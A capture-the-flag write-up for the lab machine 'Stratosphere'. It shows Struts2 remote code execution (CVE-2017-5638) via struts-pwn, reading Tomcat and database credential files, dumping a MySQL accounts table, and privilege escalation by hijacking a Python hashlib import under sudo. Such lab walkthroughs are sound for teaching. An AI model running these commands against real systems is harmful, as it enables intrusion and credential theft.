129 - Stratosphere
==================

Mandatory nmap scan:
```bash
❯❯❯ sudo nmap -sS -sV -O --top-ports=200 10.10.10.64
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-18 16:51 CEST
Nmap scan report for 10.10.10.64
Host is up (0.043s latency).
Not shown: 197 filtered ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
80/tcp   open  http
8080/tcp open  http-proxy
[CUT CUT CUT]
```

A `/Monitoring/` directory is found after some enumeration and a login page `/Monitoring/Login.action`. Burp active scan detects a Struts2 vulnerability in the page (CVE-2017-5638). This can be exploited using the following script <https://raw.githubusercontent.com/mazen160/struts-pwn/master/struts-pwn.py> or with <https://packetstormsecurity.com/files/141576/Apache-Struts-2-2.3.x-2.5.x-Remote-Code-Execution.html>

First verify that the page is vulnerable:
```bash
❯❯❯ python struts-pwn.py --check -u http://10.10.10.64/Monitoring/Login.action

[*] URL: http://10.10.10.64/Monitoring/Login.action
[*] Status: Vulnerable!
[%] Done.
```

Then see who we are:
```bash
❯❯❯ python struts-pwn.py -u http://10.10.10.64/Monitoring/Login.action -c 'id'                       ⏎

[*] URL: http://10.10.10.64/Monitoring/Login.action
[*] CMD: id
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))
Note: Server Connection Closed Prematurely

uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)

[%] Done.
```

Getting the tomcat users configuration:
```bash
❯❯❯ python struts-pwn.py -u http://10.10.10.64/Monitoring/Login.action -c 'cat conf/tomcat-users.xml'

[*] URL: http://10.10.10.64/Monitoring/Login.action
[*] CMD: cat conf/tomcat-users.xml
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))
Note: Server Connection Closed Prematurely

[CUT CUT CUT]
<user username="teampwner" password="cd@6sY{f^+kZV8J!+o*t|<fpNy]F_(Y$" roles="manager-gui,admin-gui" />
</tomcat-users>
```

db_connect
```
[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin
```

Looking at the running process we can see a mysql. Let's log on the server with the "users" credentials and see what DB are present:
```bash
❯❯❯ python struntsrce.py --target='http://10.10.10.64/Monitoring/Login.action' --cmd='mysql -uadmin -padmin -e "show databases;" > /tmp/r1 && cat /tmp/r1'

[+] Target: http://10.10.10.64/Monitoring/Login.action
[+] Executing: mysql -uadmin -padmin -e "show databases;" > /tmp/r1 && cat /tmp/r1


Database
information_schema
users
```

OK, a DB `users`, what tables are present?
```bash
❯❯❯ python struntsrce.py --target='http://10.10.10.64/Monitoring/Login.action' --cmd='mysql -uadmin -padmin -e "use users; show tables;" > /tmp/r1 && cat /tmp/r1'

[+] Target: http://10.10.10.64/Monitoring/Login.action
[+] Executing: mysql -uadmin -padmin -e "use users; show tables;" > /tmp/r1 && cat /tmp/r1


Tables_in_users
accounts
```

Let's get everything that's in this table:
```bash
❯❯❯ python struntsrce.py --target='http://10.10.10.64/Monitoring/Login.action' --cmd='mysql -uadmin -padmin -e "use users; select * from accounts;" > /tmp/r1 && cat /tmp/r1'

[+] Target: http://10.10.10.64/Monitoring/Login.action
[+] Executing: mysql -uadmin -padmin -e "use users; select * from accounts;" > /tmp/r1 && cat /tmp/r1


fullName	password	username
Richard F. Smith	9tc*rhKuG5TyXvUJOrE^5CK7k	richard
```

And this is the password of the user named `richard`. From here, it is easy to get the user flag:
```bash
❯❯❯ ssh richard@10.10.10.64
Linux stratosphere 4.9.0-6-amd64 #1 SMP Debian 4.9.82-1+deb9u2 (2018-02-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 19 08:41:42 2018 from 10.10.15.80
richard@stratosphere:~$ cat user.txt
e610b298611fa732fca1665a1c02336b
```

## Privilege escalation
In the user directory we have a `test.py` file that contains a kind of quizz:
```python
#!/usr/bin/python3
import hashlib


def question():
    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
    md5 = hashlib.md5()
    md5.update(q1.encode())
    if not md5.hexdigest() == "5af003e100c80923ec04d65933d382cb":
        print("Sorry, that's not right")
        return
    print("You got it!")
    q2 = input("Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff\n")
    sha1 = hashlib.sha1()
    sha1.update(q2.encode())
    if not sha1.hexdigest() == 'd24f6fb449855ff42344feff18ee2819033529ff':
        print("Nope, that one didn't work...")
        return
    print("WOW, you're really good at this!")
    q3 = input("How about this? 91ae5fc9ecbca9d346225063f23d2bd9\n")
    md4 = hashlib.new('md4')
    md4.update(q3.encode())
    if not md4.hexdigest() == '91ae5fc9ecbca9d346225063f23d2bd9':
        print("Yeah, I don't think that's right.")
        return
    print("OK, OK! I get it. You know how to crack hashes...")
    q4 = input("Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943\n")
    blake = hashlib.new('BLAKE2b512')
    blake.update(q4.encode())
    if not blake.hexdigest() == '9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943':
        print("You were so close! urg... sorry rules are rules.")
        return

    import os
    os.system('/root/success.py')
    return

question()
```

This is cool because with sudo we are allowed to run this script as shown by:
```bash
richard@stratosphere:~$ sudo -l
Matching Defaults entries for richard on stratosphere:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on stratosphere:
    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
```

Let's crack those hashes:
```
MD5: kaybboo!
SHA1: ninjaabisshinobi
MD4: legend72
BLAKE2b512: Fhero6610
```

But at the end of the script, the `/root/success.py` script is not found. But we have another way to escalate. We can leverage the fact that the script imports a library. Let's create a malicious `hashlib.py` file in the same directory. The content of the file is:
```python
#!/usr/bin/python3

f = open('/root/root.txt', 'r')
print(f.read())
f.close()
```

Now we can run `test.py` with sudo and hijack the library import to read the flag:
```bash
richard@stratosphere:~$ sudo /usr/bin/python3 /home/richard/test.py 
d41d8cd98f00b204e9800998ecf8427e

Solve: 5af003e100c80923ec04d65933d382cb
^CTraceback (most recent call last):
  File "/home/richard/test.py", line 38, in <module>
    question()
  File "/home/richard/test.py", line 6, in question
    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
KeyboardInterrupt
```
